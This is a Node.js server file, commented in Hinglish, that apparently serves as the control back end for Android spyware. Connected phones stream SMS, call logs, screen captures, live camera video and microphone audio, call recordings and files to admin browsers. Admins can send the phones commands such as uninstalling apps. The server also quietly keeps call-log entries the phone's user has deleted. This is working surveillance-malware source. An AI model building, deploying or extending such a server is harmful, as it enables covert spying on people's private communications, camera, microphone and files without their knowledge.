const express = require("express");
const http = require("http");
const fs = require("fs");
const path = require("path");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  maxHttpBufferSize: 5e8,   // 500MB — badi files ke liye
  cors: { origin: "*" },
  pingTimeout: 120000,      // 2 minutes — badi file transfer ke dauran disconnect na ho
  pingInterval: 25000
});

app.use(express.json());
app.use(express.static("public"));

// 🎙️ Recording cache — Android se aaya base64 data
let recordingCache = {};

// 🎙️ Chunked upload cache — badi files chunk-by-chunk aati hain
let chunkCache = {};

// =====================================================
// 🎙️ RECORDING — HTTP se direct file upload & serve
// Socket/base64 ka chakkar nahi — seedha binary file
// =====================================================
const RECORDINGS_DIR = path.join(__dirname, "data", "recordings");
if (!fs.existsSync(RECORDINGS_DIR)) fs.mkdirSync(RECORDINGS_DIR, { recursive: true });

// Android → Server: File seedha HTTP POST se upload karo
app.post("/upload-recording", (req, res) => {
  const deviceId = req.headers["x-device-id"] || "unknown";
  const fileName  = req.headers["x-file-name"]  || `rec_${Date.now()}.mp3`;
  const filePath  = req.headers["x-file-path"]  || fileName;

  const savePath = path.join(RECORDINGS_DIR, deviceId + "_" + fileName.replace(/[^a-zA-Z0-9._-]/g, "_"));

  const writeStream = fs.createWriteStream(savePath);
  req.pipe(writeStream);

  writeStream.on("finish", () => {
    // recordingCache mein path store karo taaki /recording endpoint find kar sake
    if (!recordingCache[deviceId]) recordingCache[deviceId] = {};
    recordingCache[deviceId][filePath] = { diskPath: savePath, mimeType: getMimeType(fileName) };
    console.log(`✅ Recording uploaded: ${fileName} (${fs.statSync(savePath).size} bytes)`);

    // Sabhi admins ko notify karo
    for (const [id, sock] of io.sockets.sockets) {
      if (!sock.isDevice) {
        sock.emit("recording_ready", { deviceId, path: filePath, fileName });
      }
    }
    res.json({ ok: true, saved: savePath });
  });

  writeStream.on("error", (e) => {
    console.error("❌ Upload error:", e.message);
    res.status(500).send("Upload failed");
  });
});

function getMimeType(fileName) {
  const ext = fileName.split(".").pop().toLowerCase();
  const map = { mp3: "audio/mpeg", mp4: "audio/mp4", m4a: "audio/mp4", aac: "audio/aac", amr: "audio/amr", wav: "audio/wav", "3gp": "audio/3gpp" };
  return map[ext] || "audio/mpeg";
}

// Admin → Browser: File serve karo — Range headers ke saath (seekable)
app.get("/recording", (req, res) => {
  const filePath = req.query.path;
  if (!filePath) return res.status(400).send("No path");

  // Cache mein dhundho
  let found = null;
  for (const deviceId in recordingCache) {
    if (recordingCache[deviceId][filePath]) {
      found = recordingCache[deviceId][filePath];
      break;
    }
  }
  if (!found) return res.status(404).send("Recording not found");

  const mime = found.mimeType || "audio/mpeg";
  const fileName = filePath.split("/").pop();

  // ✅ Disk pe saved file — seedha stream karo (badi files ke liye best)
  if (found.diskPath && fs.existsSync(found.diskPath)) {
    const stat = fs.statSync(found.diskPath);
    const totalSize = stat.size;

    res.setHeader("Accept-Ranges", "bytes");
    res.setHeader("Content-Type", mime);
    res.setHeader("Content-Disposition", `inline; filename="${fileName}"`);

    const rangeHeader = req.headers["range"];
    if (!rangeHeader) {
      res.setHeader("Content-Length", totalSize);
      fs.createReadStream(found.diskPath).pipe(res);
      return;
    }

    const parts = rangeHeader.replace(/bytes=/, "").split("-");
    const start = parseInt(parts[0], 10);
    const end   = parts[1] ? parseInt(parts[1], 10) : totalSize - 1;

    if (start >= totalSize || end >= totalSize || start > end) {
      res.setHeader("Content-Range", `bytes */${totalSize}`);
      return res.status(416).send("Range Not Satisfiable");
    }

    res.setHeader("Content-Range", `bytes ${start}-${end}/${totalSize}`);
    res.setHeader("Content-Length", end - start + 1);
    res.status(206);
    fs.createReadStream(found.diskPath, { start, end }).pipe(res);
    return;
  }

  // Fallback: purana base64 cache (choti files ke liye)
  if (found.base64) {
    const buffer = Buffer.from(found.base64, "base64");
    const totalSize = buffer.length;

    res.setHeader("Accept-Ranges", "bytes");
    res.setHeader("Content-Type", mime);
    res.setHeader("Content-Disposition", `inline; filename="${fileName}"`);

    const rangeHeader = req.headers["range"];
    if (!rangeHeader) {
      res.setHeader("Content-Length", totalSize);
      return res.status(200).end(buffer);
    }

    const parts = rangeHeader.replace(/bytes=/, "").split("-");
    const start = parseInt(parts[0], 10);
    const end   = parts[1] ? parseInt(parts[1], 10) : totalSize - 1;

    if (start >= totalSize || end >= totalSize || start > end) {
      res.setHeader("Content-Range", `bytes */${totalSize}`);
      return res.status(416).send("Range Not Satisfiable");
    }

    res.setHeader("Content-Range", `bytes ${start}-${end}/${totalSize}`);
    res.setHeader("Content-Length", end - start + 1);
    return res.status(206).end(buffer.slice(start, end + 1));
  }

  res.status(404).send("Recording data not available");
});

let devices = {};
let deviceSockets = {};

// =====================================================
// 💾 FILE PERSISTENCE SETUP
// =====================================================
const DATA_DIR = path.join(__dirname, "data");
const DELETED_LOGS_FILE = path.join(DATA_DIR, "deleted_call_logs.json");
const SNAPSHOTS_FILE = path.join(DATA_DIR, "call_log_snapshots.json");

// Data folder banao agar nahi hai
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  console.log("📁 Data directory created:", DATA_DIR);
}

// File se load karo — server restart pe data wapas aata hai
function loadJSON(filePath) {
  try {
    if (fs.existsSync(filePath)) {
      const raw = fs.readFileSync(filePath, "utf8");
      return JSON.parse(raw);
    }
  } catch (e) {
    console.error(`❌ Load error [${filePath}]:`, e.message);
  }
  return {};
}

// File mein save karo
function saveJSON(filePath, data) {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), "utf8");
  } catch (e) {
    console.error(`❌ Save error [${filePath}]:`, e.message);
  }
}

// Server start hone par purana data load karo
let deletedCallLogs = loadJSON(DELETED_LOGS_FILE);
let callLogSnapshots = loadJSON(SNAPSHOTS_FILE);

console.log(`✅ Loaded deleted logs for ${Object.keys(deletedCallLogs).length} device(s)`);
console.log(`✅ Loaded snapshots for ${Object.keys(callLogSnapshots).length} device(s)`);

// =====================================================
// HTTP: Device Registration
// =====================================================
app.post("/register", (req, res) => {
  const d = req.body;
  if (!d.deviceId) return res.status(400).send("No deviceId");
  d.lastSeen = Date.now();
  d.online = true;
  devices[d.deviceId] = d;
  console.log("📱 Device Registered:", d.deviceId);
  io.emit("update", devices);
  res.json({ ok: true });
});

// =====================================================
// HTTP: Admin panel ke liye deleted logs fetch API
// =====================================================
app.get("/deleted-logs/:deviceId", (req, res) => {
  const deviceId = req.params.deviceId;
  res.json(deletedCallLogs[deviceId] || []);
});

// =====================================================
// Socket.IO
// =====================================================
io.on("connection", socket => {
  console.log("🔌 New connection:", socket.id, "| isDevice:", socket.isDevice || false);
  console.log("📊 Total connected sockets:", io.sockets.sockets.size);

  socket.emit("update", devices);

  // ─────────────────────────────────────────
  // Android Device Identity
  // ─────────────────────────────────────────
  socket.on("device_identity", (data) => {
    const deviceId = data.deviceId;
    deviceSockets[deviceId] = socket.id;
    socket.deviceId = deviceId;
    socket.isDevice = true;

    if (devices[deviceId]) {
      devices[deviceId].online = true;
      devices[deviceId].lastSeen = Date.now();
    } else {
      devices[deviceId] = { deviceId, online: true, lastSeen: Date.now() };
    }

    io.emit("update", devices);
    console.log(`📱 Android connected: ${deviceId} -> socket: ${socket.id}`);
  });

  // ─────────────────────────────────────────
  // Admin → Android Command
  // ─────────────────────────────────────────
  socket.on("command", data => {
    const targetDeviceId = data.deviceId;
    const targetSocketId = deviceSockets[targetDeviceId];

    if (targetSocketId) {
      io.to(targetSocketId).emit("command", data);
      console.log(`📤 Command [${data.type}] -> Device: ${targetDeviceId}`);
    } else {
      console.warn(`⚠️ Device ${targetDeviceId} not found, broadcasting...`);
      io.emit("command", data);
    }
  });

  // ─────────────────────────────────────────
  // Android → Admin: Call Logs
  // ─────────────────────────────────────────
  socket.on("call_logs", data => {
    const deviceId = data.deviceId;
    const newLogs = data.logs || [];

    // Purane snapshot se compare karo
    if (callLogSnapshots[deviceId]) {
      const oldLogs = callLogSnapshots[deviceId];
      const newKeys = new Set(newLogs.map(l => `${l.number}_${l.time}`));
      const justDeleted = oldLogs.filter(l => !newKeys.has(`${l.number}_${l.time}`));

      if (justDeleted.length > 0) {
        if (!deletedCallLogs[deviceId]) deletedCallLogs[deviceId] = [];

        justDeleted.forEach(log => {
          const exists = deletedCallLogs[deviceId].some(
            d => d.number === log.number && d.time === log.time
          );
          if (!exists) {
            deletedCallLogs[deviceId].push({
              ...log,
              deletedAt: new Date().toLocaleString()
            });
          }
        });

        // ✅ FILE MEIN SAVE KARO — restart ke baad bhi rahega
        saveJSON(DELETED_LOGS_FILE, deletedCallLogs);
        console.log(`🗑️ ${justDeleted.length} deleted log(s) saved for device: ${deviceId}`);
      }
    }

    // ✅ Naya snapshot save karo — file mein bhi
    callLogSnapshots[deviceId] = newLogs;
    saveJSON(SNAPSHOTS_FILE, callLogSnapshots);

    // Sirf Admin panels ko bhejo
    sendToAdmins(socket, "call_logs", {
      ...data,
      deletedLogs: deletedCallLogs[deviceId] || []
    });
  });

  // ─────────────────────────────────────────
  // Android → Admin: File Manager Data
  // ─────────────────────────────────────────
  socket.on("file_manager_data", (data) => {
    sendToAdmins(socket, "render_files", data);
  });

  // ─────────────────────────────────────────
  // Android → Admin: File Download
  // ─────────────────────────────────────────
  socket.on("file_downloaded", (data) => {
    sendToAdmins(socket, "file_downloaded", data);
  });

  // ─────────────────────────────────────────
  // Android → Admin: Installed Apps List
  // ─────────────────────────────────────────
  socket.on("installed_apps", (data) => {
    console.log(`📦 Apps from ${data.deviceId}: ${data.apps?.length || 0} apps`);
    sendToAdmins(socket, "installed_apps", data);
  });

  // ─────────────────────────────────────────
  // Android → Admin: Uninstall Result
  // ─────────────────────────────────────────
  socket.on("uninstall_result", (data) => {
    console.log(`🗑️ Uninstall ${data.packageName}: ${data.success ? "✅" : "❌"} ${data.message}`);
    sendToAdmins(socket, "uninstall_result", data);
  });

  // ─────────────────────────────────────────
  // Android → Admin: App Action Result
  // ─────────────────────────────────────────
  socket.on("app_action_result", (data) => {
    console.log(`📱 App action [${data.action}] ${data.packageName}: ${data.success ? "✅" : "❌"}`);
    sendToAdmins(socket, "app_action_result", data);
  });

  // ─────────────────────────────────────────
  // Android → Admin: Screen Frame
  // ─────────────────────────────────────────
  socket.on("screen_frame", (data) => {
    sendToAdmins(socket, "screen_frame", data);
  });

  // ─────────────────────────────────────────
  // Android → Admin: Camera Frame
  // ─────────────────────────────────────────
  socket.on("camera_frame", (data) => {
    const count = sendToAdmins(socket, "camera_frame", data);
    if (count === 0) {
      console.warn(`⚠️ camera_frame received but 0 admins connected! Socket isDevice=${socket.isDevice}`);
    }
  });

  // ─────────────────────────────────────────
  // Android → Admin: Camera Mic Audio
  // ─────────────────────────────────────────
  socket.on("camera_audio", (data) => {
    sendToAdmins(socket, "camera_audio", data);
  });

  // ─────────────────────────────────────────
  // Heartbeat
  // ─────────────────────────────────────────
  socket.on("heartbeat", (data) => {
    if (data.deviceId && devices[data.deviceId]) {
      devices[data.deviceId].lastSeen = Date.now();
      devices[data.deviceId].online = true;
    }
  });

  // ─────────────────────────────────────────
  // Android → Admin: All Recordings List
  // ─────────────────────────────────────────
  socket.on("all_recordings_list", (data) => {
    console.log(`🎙️ All recordings list from ${data.deviceId}: ${data.totalCount || 0} files`);
    sendToAdmins(socket, "all_recordings_list", data);
  });

  // ─────────────────────────────────────────
  // Android → Admin: Recording Updates (background scan result)
  // ─────────────────────────────────────────
  socket.on("recording_updates", (data) => {
    console.log(`🎙️ Recording updates from ${data.deviceId}: ${data.updates?.length || 0} matches`);
    sendToAdmins(socket, "recording_updates", data);
  });

  // ─────────────────────────────────────────
  // Android → Server: Recording File (choti file — seedha)
  // ─────────────────────────────────────────
  socket.on("recording_file", (data) => {
    const deviceId = data.deviceId;
    if (!recordingCache[deviceId]) recordingCache[deviceId] = {};
    recordingCache[deviceId][data.filePath] = {
      base64: data.base64,
      mimeType: data.mimeType || "audio/mpeg"
    };
    console.log(`🎙️ Recording cached: ${data.fileName}`);
    sendToAdmins(socket, "recording_ready", {
      deviceId, path: data.filePath, fileName: data.fileName
    });
  });

  // ─────────────────────────────────────────
  // Android → Server: Recording Chunk (badi file — pieces mein)
  // ─────────────────────────────────────────
  socket.on("recording_chunk", (data) => {
    const { deviceId, filePath, fileName, mimeType, chunkIndex, totalChunks, chunkData } = data;
    const key = `${deviceId}:${filePath}`;

    if (!chunkCache[key]) {
      chunkCache[key] = { totalChunks, chunks: new Array(totalChunks), mimeType, fileName, deviceId, filePath };
    }

    chunkCache[key].chunks[chunkIndex] = chunkData;
    const received = chunkCache[key].chunks.filter(Boolean).length;
    console.log(`🎙️ Chunk ${chunkIndex + 1}/${totalChunks} for: ${fileName} (${received} done)`);

    // Admin ko progress bhejo
    sendToAdmins(socket, "recording_progress", {
      deviceId, filePath, fileName,
      progress: Math.round((received / totalChunks) * 100)
    });

    // Sab chunks aa gaye? Assemble karo
    if (received === totalChunks) {
      const allChunks = chunkCache[key].chunks;
      // DEBUG: har chunk ka size check karo
      allChunks.forEach((c, i) => {
        if (!c) console.error(`❌ CHUNK ${i} IS NULL/UNDEFINED!`);
        else if (i < 3 || i === allChunks.length-1) console.log(`🔍 Chunk ${i}: length=${c.length}`);
      });
      const fullBase64 = allChunks.join("");
      console.log(`🔍 Assembled base64 total length: ${fullBase64.length}`);
      if (!recordingCache[deviceId]) recordingCache[deviceId] = {};
      recordingCache[deviceId][filePath] = { base64: fullBase64, mimeType: mimeType || "audio/mpeg" };
      delete chunkCache[key];
      console.log(`✅ Recording assembled: ${fileName}`);
      sendToAdmins(socket, "recording_ready", { deviceId, path: filePath, fileName });
    }
  });


  socket.on("sms_data", (data) => {
    console.log(`💬 SMS data from ${data.deviceId}: ${data.threads?.length || 0} threads`);
    sendToAdmins(socket, "sms_data", data);
  });

  // ─────────────────────────────────────────
  // Disconnect
  // ─────────────────────────────────────────
  socket.on("disconnect", () => {
    for (let deviceId in deviceSockets) {
      if (deviceSockets[deviceId] === socket.id) {
        if (devices[deviceId]) {
          devices[deviceId].online = false;
          devices[deviceId].lastSeen = Date.now();
          io.emit("update", devices);
        }
        delete deviceSockets[deviceId];
        console.log(`📴 Android disconnected: ${deviceId}`);
        break;
      }
    }
    console.log(`🔌 Socket disconnected: ${socket.id}`);
  });
});

// =====================================================
// Helper: Sirf Admin panels ko bhejo
// =====================================================
function sendToAdmins(senderSocket, event, data) {
  let adminCount = 0;
  const allSockets = [];

  for (const [id, sock] of io.sockets.sockets) {
    allSockets.push(`${id.slice(0,8)} isDevice=${sock.isDevice || false} deviceId=${sock.deviceId || 'none'}`);

    if (id === senderSocket.id) continue;
    if (sock.isDevice || (sock.deviceId && sock.deviceId !== "")) continue;

    sock.emit(event, data);
    adminCount++;
  }

  if (event === "camera_frame" && adminCount === 0) {
    console.warn(`⚠️ camera_frame: 0 admins! All sockets:`);
    allSockets.forEach(s => console.warn("   →", s));
  }

  return adminCount;
}

// =====================================================
// AUTO-CLEANUP: Har 10s mein offline devices mark karo
// =====================================================
setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (let id in devices) {
    if (devices[id].online && (now - devices[id].lastSeen > 20000)) {
      devices[id].online = false;
      changed = true;
      console.log(`⏰ Device timeout: ${id}`);
    }
  }
  if (changed) io.emit("update", devices);
}, 10000);

server.listen(8000, "0.0.0.0", () => console.log("🚀 Server running on port 8000"));